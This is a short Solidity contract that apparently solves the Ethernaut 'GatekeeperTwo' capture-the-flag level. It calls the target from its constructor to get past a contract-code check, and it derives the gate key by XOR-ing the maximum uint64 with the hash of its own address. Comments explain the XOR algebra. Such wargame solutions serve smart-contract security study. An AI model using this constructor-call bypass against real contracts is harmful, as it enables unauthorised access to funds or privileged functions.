// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IGatekeeperTwo { 
    function enter(bytes8 _gateKey) external returns (bool);
}

contract EntrantTwo is Ownable {
    IGatekeeperTwo _gateKeeper;

    constructor(address _gatekeeperAddress) public payable {
        _gateKeeper = IGatekeeperTwo(_gatekeeperAddress);

        // The key needs to fulfill:
        // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1
        // so calculate mask based on this
        // c = a^b;
        // a = c^b; or b^c (order is not important)
        // b = c^a; or a^c
        uint64 key = (uint64(0) - 1) ^ uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        _gateKeeper.enter(bytes8(key));
    }
}
